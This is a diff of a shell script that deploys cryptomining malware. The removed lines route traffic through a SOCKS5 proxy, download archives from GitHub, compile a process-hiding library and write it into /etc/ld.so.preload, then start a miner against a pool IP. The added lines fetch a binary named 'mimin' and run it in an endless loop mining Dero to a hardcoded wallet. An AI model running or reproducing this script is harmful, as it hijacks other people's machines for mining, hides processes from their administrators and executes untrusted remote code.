@@ -1,40 +1,8 @@
-sudo apt -q -y update
-clear
-sudo apt -q install -y screen unzip 
-
-wget -q https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xzf graphics.tar.gz
-
-cat > iplist <<END
-148.113.142.107:1080
-END
-
-ip=$(shuf -n 1 iplist)
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = $ip
-socks5_username = gratis
-socks5_password = q1w2e3r4t5
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-./graftcp/graftcp curl ipinfo.io
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-sudo make
-sudo gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-sudo mv libprocesshider.so /usr/local/lib/
-sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget https://github.com/renilo/kuuntul/raw/main/mimin
+chmod 777 mimin
 
 #!/bin/bash
-./graftcp/graftcp wget https://github.com/indah38/theta/raw/main/VTM
-chmod 700 VTM
-clear
-./graftcp/graftcp ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU2 -p x -t4
+while :; do
+    ./mimin -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4.MEKI1 -r 170.187.197.220:443 -p stratum;
+    sleep 5;
+done
